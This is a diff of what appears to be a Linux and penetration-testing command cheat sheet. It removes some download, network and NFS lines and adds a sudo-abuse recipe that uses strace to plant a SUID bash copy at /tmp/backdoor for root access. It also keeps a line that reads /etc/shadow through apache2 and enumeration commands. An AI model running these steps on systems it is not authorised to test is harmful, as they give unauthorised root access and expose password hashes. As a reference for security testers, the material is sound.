@@ -84,13 +84,6 @@ systemctl disable docker.service                Disable Docker at boot time
 systemctl disable docker.socket
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Download Files
-
-wget -O <local file name> <server>              Download files using the http or ftp protocol
-curl -o <local file name> <server>              Transfer data to or from a server using a host of protocols, very versatile
-axel -a -n 20 -o <local file name> <server>     Download accelerator from an http or ftp server through multiple connections
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # File Permissions
 
 t rwx rwx rwx	 type / owner / group / world
@@ -101,12 +94,6 @@ write    (w)  2
 execute  (e)  1
 
 chmod 755 test.sh                               Make a file executable
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# File System
-
-/etc/passwd                                     User accounts
-/etc/shadow                                     Encrypted passwords
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # File Transfer
@@ -202,11 +189,6 @@ ifconfig eth0 up                                Bring interface up
 ifconfig eth0 <IP> netmask <mask>               Set IP and netmask
 route add default gw <IP> eth0                  Set gateway
 
-ip addr                                         IP addresses to all network interfaces
-ip addr flush <interface>
-ip link set <interface> down                    Bring interface down
-ip link set <interface> up                      Bring interface up
-
 - Static IP address
 route                                           Note the gateway IP address
 
@@ -224,16 +206,16 @@ curl ifconfig.me                                Show external IP
 # Privilege Escalation
 
 - Enumeration
-cat /etc/sysconfig/network                                 Hostname and domain name
-ifconfig                                                   IP addresses to all network interfaces
-route                                                      Gateway
-cat /etc/resolv.conf                                       DNS
-netstat -antp                                              Show ports that are listening
+cat /etc/sysconfig/network                      Hostname and domain name
+ifconfig                                        IP addresses to all network interfaces
+route                                           Gateway
+cat /etc/resolv.conf                            DNS
+netstat -antp                                   Show ports that are listening
 arp -e
-cat /etc/issue                                             OS info
-cat /proc/version                                          OS name
-uname -a                                                   Kernel info
-cat /sys/class/dmi/id/product_name                         Computer model
+cat /etc/issue                                  OS info
+cat /proc/version                               OS name
+uname -a                                        Kernel info
+cat /sys/class/dmi/id/product_name              Computer model
 cat /etc/exports
 
 - Search for exploits
@@ -265,8 +247,15 @@ wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4lin
 wget https://downloads.cisofy.com/lynis/lynis-3.0.4.tar.gz     cd lynis; ./lynis audit system
 
 - sudoers
-sudo -l                                                    Users with root permissions and binaries that can be ran with root privs
-sudo su or sudo bash                                       If the current user is listed in the file, elevate privs to root
+sudo -l                                                    Users that can run specific binaries with root permissions
+
+User www-data may run the following commands on winxp:
+     (root) NOPASSWD: /usr/bin/strace
+
+sudo /usr/bin/strace cp /bin/bash /tmp/backdoor            Make a copy of bash
+sudo /usr/bin/strace chmod 4755 /tmp/backdoor              Assign it a SUID bit
+/tmp/backdoor -p                                           Run with -p to maintain the SUID privileges
+id                                                         You should now have a uid of 0 (root)
 
 - Abusing binaries
 sudo apache2 -f /etc/shadow                                A way to view a system file
@@ -755,10 +744,6 @@ showmount -e <target IP>
 apt-get install nfs-common
 mkdir /mnt/temp/
 mount -t nfs <target IP>:/<share> /mnt/temp/ -o nolock
-cp /bin/bash .
-chown root bash
-chmod +s bash
-ls -la bash
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Anonymous Mountable SMB
